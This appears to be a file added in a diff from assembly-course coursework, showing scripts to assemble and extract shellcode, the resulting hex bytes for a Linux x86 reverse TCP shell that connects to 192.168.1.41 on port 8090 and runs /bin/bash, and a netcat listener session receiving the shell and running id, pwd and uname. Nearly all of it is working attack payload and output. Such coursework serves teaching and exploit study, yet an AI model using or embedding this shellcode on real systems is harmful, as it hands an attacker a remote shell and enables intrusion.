@@ -1,0 +1,36 @@
+1.-Compile and get the shellcode :
+
+$ cat compile_asm.sh 
+
+  #!/bin/bash
+  echo '[+] Assembling with NASM ... '
+  nasm -f elf32 -o $1.o $1.asm
+  echo '[+] Linking ...'
+  ld -o $1 $1.o
+  echo '[+] Done!'
+  
+$ ./compile_asm.sh reverse_tcp_shell
+
+$ cat get_shellcode.sh 
+    #!/bin/bash
+    for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+
+$ ./get_shellcode.sh reverse_tcp_shell
+\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x31\xc9\x89\xe1\xcd\x80\x89\xc6\x31\xc0
+\xb0\x66\x31\xdb\xb3\x03\x68\xc0\xa8\x01\x29\x66\x68\x1f\x9a\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56
+\x89\xe1\xcd\x80\x87\xde\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc0\x50\x68\x62\x61
+\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+2.- Reverse shell to attacker
+
+root@bt:~# nc -l -v -p 8090
+listening on [any] 8090 ...
+192.168.1.38: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.1.41] from (UNKNOWN) [192.168.1.38] 58093
+id
+uid=1000(snow) gid=1000(snow) groups=1000(snow),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+pwd
+/home/snow/SLAE
+uname -a
+Linux ubuntu-vm 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 i686 i686 i386 GNU/Linux
+
